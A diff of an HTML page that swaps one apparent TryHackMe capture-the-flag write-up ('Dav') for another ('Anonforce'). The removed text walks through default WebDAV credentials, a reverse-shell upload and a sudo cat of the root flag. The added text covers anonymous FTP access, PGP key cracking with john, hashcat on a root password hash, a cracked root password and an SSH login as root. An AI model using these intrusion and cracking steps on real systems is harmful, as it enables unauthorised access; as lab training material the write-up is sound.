@@ -15,17 +15,17 @@
   <link rel="apple-touch-icon" sizes="180x180" href="./assets/apple-icon-180x180.png">
   <link href="./assets/favicon.ico" rel="icon">
 
-  <title>HA Joker CTF</title>  
+  <title>Anonforce</title>  
 
 <link href="./main.3f6952e4.css" rel="stylesheet"></head>
 
-<body class="minimal">
+<body class="minimal" >
 <div id="site-border-left"></div>
 <div id="site-border-right"></div>
 <div id="site-border-top"></div>
 <div id="site-border-bottom"></div>
-<header>
-  <nav class="navbar  navbar-fixed-top navbar-inverse">
+<header style="position: fixed;width: 100%;z-index: 1000;">
+  <nav class="white-text-container" style="height: 110px;background-color: black; opacity: .9; padding-top: 20px;padding-bottom: 20px;">
     <div class="container">
         <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false">
           <span class="sr-only">Toggle navigation</span>
@@ -49,97 +49,103 @@
     </div>
   </nav>
 </header>
-  <div class="hero-full-container background-image-container white-text-container" style="overflow: auto;background-image: url('./assets/images/back.jpg')">
+  <div class="hero-full-container background-image-container white-text-container" >
     <div class="container">
       <div class="row">
         <div class="col-xs-12">
           <div class="hero-full-wrapper">
             <div class="text-content mytext">
-              <h1>Dav - THM<br>
+              <h1>Anonforce - THM<br>
                 <div class="paragragh">
                   <p>
 <br>
 <br>
-<p>Ok lets start with the basics, Nmap, Gobuster etc.</p>
 <br>
-<p>nmap -v -sC -sV -oA nmap  10.10.153.21</p>
+<p>Ok so lets start of with a simple Nmap</p>
 <br>
+<p>nmap -v -sC -sV -oA nmap  10.10.177.146</p>
 <br>
-<img src="./dav/1.png">
+<img src="./anon/1.PNG">
 <br>
+<img src="./anon/2.PNG">
 <br>
-<p>Looks like we only have a one port open... port 80, lets take a look.</p>
+<p>So looks like we can only work with an ftp and a ssh. The ftp seems to be able to login with Anonymous creds, lets try it!</p>
 <br>
+<p>ftp 10.10.177.146</p>
 <br>
-<img src="./dav/2.png">
+<p>anonymous:anonymous</p>
 <br>
+<img src="./anon/3.PNG">
 <br>
-<p>Ok so we got a deafault ubuntu page not much we can work with, lets try godbuster</p>
+<p>And as easy as that we can access the ftp. Lets look around to see what we can find</p>
 <br>
-<p>gobuster dir -u 10.10.153.21 -w /usr/share/wordlists/dirb/common.txt -t 20 -x .php,.txt,.htm</p>
+<p>hmmm seems have access to a lot of files and even user folders, can we get the user.txt?</p>
 <br>
+<img src="./anon/4.PNG">
 <br>
-<img src="./dav/3png">
+<img src="./anon/5.PNG">
 <br>
+<p>Ok cool now we got the user flag, lets keep looking around.</p>
 <br>
-<p>Ok so not much but one directory does look intresting, lest try /webdav</p>
+<p>After some enumerating there seems to be file called “notread” in /. lets have a look</p>
 <br>
+<img src="./anon/6.PNG">
 <br>
-<img src="./dav/4.png">
+<img src="./anon/7.PNG">
 <br>
+<p>hmmm seems like pgp file with a asc key, lets get them and take look.</p>
 <br>
-<p>hhh seems like its password protected. Just a few google searchs and some enumerating and you can found the deafult logins for webdav </p>
+<img src="./anon/8.PNG">
 <br>
-<p>You can find the website <a href="https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html" title="">here</a>.</p>
+<p>So looks like were gonna have to crack it, lets use gpg2john</p>
 <br>
-<p>wampp:xampp</p>
+<p>gpg --import private.asc</p>
 <br>
+<img src="./anon/9.PNG">
 <br>
-<p>Ok cool now we have access to /webdev, after looking around theres not much to see other the the password file which we already owned</p>
+<p>sudo gpg2john backup.pgp > backupBop</p>
 <br>
+<img src="./anon/10.PNG">
 <br>
-<img src="./dav/5.png">
+<p>sudo gpg2john private.asc > privateBop</p>
 <br>
+<img src="./anon/11.PNG">
 <br>
-<p>Looking at another website which you can find here we can see and easy exploit to upload a file which we can abuse to upload a reverse shell!</p>
-<br><a href="./index.html" title="">
-<p>cadaver http://10.10.153.21/webdav
+<p>sudo john privateBop</p>
 <br>
-<img src="./dav/6.png">
+<img src="./anon/12.PNG">
 <br>
-<p>From here have access to be able to put files which we can abuse to upload a reverse shell</p>
+<p>gpg --import private.asc</p>
 <br>
-<img src="./dav/7.png">
+<img src="./anon/13.PNG">
 <br>
-<p>Now if we go back to 10.10.153.21/webdav/ we can see our reverse shell there</p>
+<p>gpg --decrypt backup.pgp</p>
 <br>
-<p>Lets setup a listener to get the shell</p>
+<img src="./anon/14.PNG">
 <br>
-<img src="./dav/8.png">
+<p>Ok cool looks like we got the passwd file, lets crack the root password!</p>
 <br>
-<p>Open the reverse shell on /webdav and bam, we got a shell.</p>
+<p>echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > hash</p>
 <br>
-<img src="./dav/9.png">
+<p>hashcat -m 1800 hash --wordlist /usr/share/wordlists/rockyou.txt --force</p>
 <br>
-<p>Lets improve our shell</p>
+<img src="./anon/15.PNG">
 <br>
-<p>python -c 'import pty; pty.spawn("/bin/bash");'</p>
+<p>Ok now the root creds lets try logging in with ssh</p>
+ <br>
+<p>root:hikari</p>
 <br>
-<img src="./dav/10.png">
+<p>ssh root@10.10.177.146</p>
 <br>
-<p>Lets see what sudo permission we have</p>
+<img src="./anon/16.PNG">
 <br>
-<img src="./dav/11.png">
+<p>Cool now we got root, lets cat the roof flag.</p>
 <br>
-<p>Looks like we can abuse ‘cat’. Lets try cat the root flag</p>
+<img src="./anon/17.PNG">
 <br>
-<p>sudo cat /root/root.txt</p>
+<p>And as easy as that there it is.</p>
 <br>
-<img src="./dav/12.png">
-<br>
-<p>Easy as that we got the root flag!</p>
-<br>
-<p>Thank you for reading my writeup and enjoy the rest of your day :)</p>
+<p>Thank you for reading my write up and hope you enjoy your day!</p>
 <br>
 <br>
 <br>
